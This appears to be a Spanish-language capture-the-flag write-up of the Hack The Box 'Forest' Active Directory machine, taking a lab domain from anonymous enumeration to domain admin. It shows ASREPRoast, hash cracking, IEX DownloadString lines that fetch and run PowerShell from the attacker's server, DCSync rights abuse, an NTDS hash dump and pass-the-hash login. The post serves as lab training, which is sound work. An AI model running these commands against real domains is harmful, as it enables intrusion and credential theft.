---
layout      : post
title       : "Forest - HackTheBox"
author      : elc4br4
image       : assets/images/HTB/Forest-HackTheBox/Forest.webp
category    : [ htb ]
tags        : [ Windows ]
---

En esta ocasión vamos a resolver la máquina Forest de nivel Easy, que la verdad, de Easy tiene poco... Realizaremos ataque ASREPRoast, crackearemos hashes, y realizaremos una escalada algo difícil para ser una máquina de nivel Easy, abusando de privilegios Generic All y WriteDacl.

![](/assets/images/HTB/Forest-HackTheBox/rating-forest.webp)

[![HTBadge](https://www.hackthebox.eu/badge/image/533771)](https://www.hackthebox.com/home/users/profile/533771)

...


**Un pequeño INDICE**

1. [Reconocimiento](#reconocimiento).
    * [Reconocimiento de Puertos](#recon-nmap).
2. [SMB](#smb).
3. [ASREPRoast](#asreproast).   
4. [Escalada de Privilegios](#privesc). 
    * [BloodHound](#blood).   


...

# Reconocimiento [#](reconocimiento) {#reconocimiento}

----

## Reconocimiento de Puertos [📌](#recon-nmap) {#recon-nmap}

Antes de comenzar con el reconocimiento, lanzo la utilidad WhichSystem que nos indica ante que sistema nos enfrentamos, basándose en el ttl.

![](/assets/images/HTB/Forest-HackTheBox/whichsystem1.webp)

Aquí os dejo el código de la herramienta:

![](/assets/images/HTB/Forest-HackTheBox/whichsystem2.webp)

Ahora que sabemos que estamos ante una máquina Windows procedemos al escaneo de puertos.

Lanzamos nmap par descubrir los puertos abiertos en la máquina.

```nmap
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49671/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49684/tcp open  unknown
49703/tcp open  unknown
49935/tcp open  unknown
```

Tenemos un listado de puertos muy amplio, procedo a obtener más info de los mismos lanzando un escaneo más avanzado para saber que servicios y versiones se ejecutan en cada puerto.

Al tener tantos puertos uso la función extracPorts de s4vitar para copiarlos todos al portapapeles:

![](/assets/images/HTB/Forest-HackTheBox/extractports1.png)

Os dejo el código que debe añadirse al archivo de configuración de vuestra shell para poder usar la función.

![](/assets/images/HTB/Forest-HackTheBox/extractports2.webp)

Una vez tenemos los puertos en el portapapeles ya lanzo el nmap

```nmap
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-09-23 13:14:14Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       .NET Message Framing
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49703/tcp open  msrpc        Microsoft Windows RPC
49935/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-09-23T13:15:06
|_  start_date: 2022-09-22T17:08:19
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_clock-skew: mean: 2h26m50s, deviation: 4h02m32s, median: 6m48s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2022-09-23T06:15:07-07:00
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
```

Al haber tantos puertos, extraigo la información más relevante para poder seguir un orden y no perderme.

* Kerberos en el puerto 88

* LDAP puertos 389/636

* SMB puerto 445

* WinRM puerto 5985

* Dominio htb.local

# SMB [#](smb) {#smb}

Comienzo por enumerar el SMB para ir obteniendo información que podría servirnos más adelante.

Enumero el servicio SMB con rpcclient, en concreto busco usuarios.

`rpcclient -W '' -c enumdomusers -U''%'' '10.10.10.161' 2>&1`

Y encuentro varios usuarios...

![](/assets/images/HTB/Forest-HackTheBox/rpcclient.webp)

Me copio estos usuarios en un archivo de texto para posteriormente intentar sacar sus hashes.

# ASREPRoast [#](asreproast) {#asreproast}


Como tenemos el puerto 88 abierto (Kerberos), intentaré atacarlo con los usuarios que hemos recolectado anteriormente.

El ataque ASREPRoast busca usuarios sin necesidad de autenticación previa de Kerberos.

A través del script GetNPUsers.py podemos detectar si alguno de los usuarios es vulnerable al ataque ASREPRoast

![](/assets/images/HTB/Forest-HackTheBox/ASREPRoast.webp)

Tenemos el hash del usuario svc-alfresco.

```hash
$krb5asrep$23$svc-alfresco@HTB.LOCAL:db1dead193ab76a7f057d07353075529$a860d291c1f7c67df9abc7ca66d7afed02eaa679c900bfc874e7b0bc67243d56ef0681efdd5a1e6ef33389a1e0aed9c16aa8346956b4f8c2efd70cf0f57537160d230d6ebbd9fa4be6e15521d30d90e6d4c193c4fb7179ef0437c131935e026147e8ce22f459b3ba1aaa86c92f22d264c9e83ac7418a7cbe254090b20e233f5352b596bbc3a605d584cb73688cbf6cafda12ea96efa1a5ecf64f085dfe63969b6fca003296c41889f03aa4883fc0948b06312da0a4d314173248601179e639a605e90eaca29e13bc4011c5f04b77572ecd8b187b44b37f40b1ac1b8290efe9a3a50c87469b3f
```

Ahora podríamos crackear este hash a través de hashcat o john

`hashcat -m 18200 hashes.hash /usr/share/wordlists/rockyou.txt --force`

> El hash descifrado es s3rvice


Ahora podemos conectarnos a través de WinRM con las credenciales obtenidas

> svc-alfresco:s3rvice

![](/assets/images/HTB/Forest-HackTheBox/winrm.webp)

Y ya podemos leer la flag user.txt


# Escalada de Privilegios [#](privesc) {#privesc}

----

## BloodHound[🩸](blood) {#blood}

Ahora toca la fase de escalar privilegios, la fase más díficil en mi opinión.

Lanzo los scripts Winpeas, windows-suggester... pero no veo nada de importancia.

Asique procedo a usar SharpHound.

Abrimos un servidor de python

> `python3 -m http.server 8080`

Subo el script SharpHound con el comando:

> `IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/SharpHound.ps1')`

Una vez subido lo ejecutamos con los siguientes parámetros

> `*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Invoke-BloodHound -CollectionMethod All -Domain HTB.local -zipFileName forest.zip`

Una vez lanzado el script se genera un archivo zip que analizaremos con la herramienta BloodHound.

```ps
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/23/2022   8:16 AM          18870 20220923081607_BloodHound.zip
```

Me lo paso a mi máquina atacante y lo abro con BloodHound para analizarlo.

![](/assets/images/HTB/Forest-HackTheBox/BloodHound1.webp)

> El grupo EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL tiene "conexión" o ruta para llegar al usuario Administrador

Pero debemos conseguir formar parte de ese grupo

![](/assets/images/HTB/Forest-HackTheBox/BloodHound2.webp)

> A través de los permisos Generic All podemos añadir usuarios a un grupo o cambiar la contraseña de usuarios. 

Busco información sobre los permisos Generic All para proceder a crear un nuevo usuario y meterlo en el grupo que queremos.

> Creamos un usuario y lo añadimos al dominio.

```ps
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user elc4br4 elc4br4 /add /domain 
The command completed successfully.
```

> Añadimos el nuevo usuario al grupo EXCHANGE WINDOWS PERMISSIONS

```ps
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" /add elc4br4
The command completed successfully.
```

> Lo comprobamos:

```ps
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions"
Group name     Exchange Windows Permissions
Comment        This group contains Exchange servers that run Exchange cmdlets on behalf of users via the management service. Its members have permission to read and modify all Windows accounts and groups. This group should not be deleted.

Members

-------------------------------------------------------------------------------
elc4br4
The command completed successfully.
```
> Ya estamos dentro del grupo


![](/assets/images/HTB/Forest-HackTheBox/BloodHound1.webp)

Ahora ya podríamos pasar directamente al usuario Adminsitrador a través del permiso WriteDacl

> WriteDACL es un permiso de objeto de Active Directory que otorga acceso de escritura a la Lista de control de acceso discrecional (DACL) del objeto de destino, lo que significa que podemos otorgarnos cualquier privilegio que queramos sobre el objeto. 

[https://casimsec.com/2021/05/14/writedacl-and-dcsync/](https://casimsec.com/2021/05/14/writedacl-and-dcsync/)


Seguiremos estos pasos:

> Descargar y subir a la máquina vícitima PowerView

Para subirlo la máquina usaremos el servidor python `python3 -m http.server 8080`

Y el siguiente comando que ejecutaremos desde la máquina víctima `*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3:8080/PowerView.ps1')`

> Otorgar derechos DCSync al usuario creado (elc4br4)

```ps
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3:8080/PowerView.ps1')
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $pass = ConvertTo-SecureString 'elc4br4' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $creds = New-Object System.Management.Automation.PSCredential('HTB\elc4br4', $pass)
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainObjectAcl -Credential $creds  -TargetIdentity "DC=HTB,DC=local" -PrincipalIdentity elc4br4 -Rights DCSync
```

> A través de secretsdump.py volcamos los hashes 

```ps
❯ sudo ./secretsdump.py htb.local/elc4br4:elc4br4@10.10.10.161
[sudo] password for elc4br4: 
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

> crackmapexec smb -u userfile -H hash

Comprobamos que el hash de Administrador es válido

![](/assets/images/HTB/Forest-HackTheBox/crackmapexec.webp)

> Iniciar sesión con psexec.py usando el Hash

![](/assets/images/HTB/Forest-HackTheBox/psexec.webp)

